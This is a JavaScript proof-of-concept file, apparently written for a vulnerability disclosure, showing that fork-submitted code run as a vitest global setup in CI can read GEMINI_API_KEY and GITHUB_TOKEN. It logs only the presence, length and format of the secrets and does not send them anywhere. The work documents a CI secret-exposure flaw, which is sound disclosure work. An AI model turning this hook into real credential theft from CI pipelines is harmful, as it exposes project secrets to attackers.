/**
 * SECURITY RESEARCH — Proof of Concept
 * Demonstrates that fork code executes during the "Run E2E tests" step
 * with access to GEMINI_API_KEY.
 *
 * This runs as a vitest globalSetup script — it executes before any test
 * in the integration test suite. The "Run E2E tests" step sets GEMINI_API_KEY
 * as a step-level environment variable, making it available to all code
 * running in that step — including this fork-controlled script.
 *
 * Contact: amhurtado@pm.me
 * VRP: GEMINI-CLI-ARTIFACT-001
 */

import { writeFileSync, readFileSync, mkdirSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

const __dirname = dirname(fileURLToPath(import.meta.url));
const evidenceDir = join(__dirname, '..', '.poc-evidence');

try { mkdirSync(evidenceDir, { recursive: true }); } catch {}

export function pocTestPhaseEvidence() {
  const apiKey = process.env.GEMINI_API_KEY || '';

  const evidence = {
    timestamp: new Date().toISOString(),
    phase: 'vitest-global-setup',
    description: 'Fork code executing during E2E test step with GEMINI_API_KEY',
    runner: {
      name: process.env.RUNNER_NAME || 'unknown',
      os: process.env.RUNNER_OS || 'unknown',
    },
    workflow: {
      name: process.env.GITHUB_WORKFLOW || 'unknown',
      run_id: process.env.GITHUB_RUN_ID || 'unknown',
      repository: process.env.GITHUB_REPOSITORY || 'unknown',
    },
    tokens: {
      GEMINI_API_KEY_present: apiKey.length > 0,
      GEMINI_API_KEY_length: apiKey.length,
      // Prove we have a real key by checking its format, not exposing any characters.
      GEMINI_API_KEY_matches_known_format: apiKey.startsWith('AIza'),
      GITHUB_TOKEN_present: 'GITHUB_TOKEN' in process.env,
      GITHUB_TOKEN_length: process.env.GITHUB_TOKEN?.length || 0,
    },
    // Attack vectors documented in POC-WRITEUP.md, not in evidence JSON.
  };

  // Also read preinstall evidence if it exists
  try {
    const preinstallPath = join(evidenceDir, 'preinstall-evidence.json');
    const preinstall = JSON.parse(readFileSync(preinstallPath, 'utf-8'));
    evidence.preinstall_phase_confirmed = true;
    evidence.preinstall_had_github_token = preinstall.tokens.GITHUB_TOKEN_present;
  } catch {
    evidence.preinstall_phase_confirmed = false;
  }

  const evidencePath = join(evidenceDir, 'test-phase-evidence.json');
  writeFileSync(evidencePath, JSON.stringify(evidence, null, 2));

  console.log('\n' + '='.repeat(72));
  console.log('  SECURITY RESEARCH PoC — GEMINI-CLI-ARTIFACT-001');
  console.log('  Phase: E2E test execution (GEMINI_API_KEY access)');
  console.log('='.repeat(72));
  console.log(`  Runner:           ${evidence.runner.name}`);
  console.log(`  GEMINI_API_KEY:   ${evidence.tokens.GEMINI_API_KEY_present ? 'PRESENT (' + evidence.tokens.GEMINI_API_KEY_length + ' chars, format match: ' + evidence.tokens.GEMINI_API_KEY_matches_known_format + ')' : 'ABSENT'}`);
  console.log(`  GITHUB_TOKEN:     ${evidence.tokens.GITHUB_TOKEN_present ? 'PRESENT (' + evidence.tokens.GITHUB_TOKEN_length + ' chars)' : 'ABSENT'}`);
  console.log(`  Preinstall phase: ${evidence.preinstall_phase_confirmed ? 'CONFIRMED (GITHUB_TOKEN was ' + (evidence.preinstall_had_github_token ? 'present' : 'absent') + ')' : 'NOT DETECTED'}`);
  console.log(`  Evidence saved:   ${evidencePath}`);
  console.log('='.repeat(72) + '\n');

  return evidence;
}
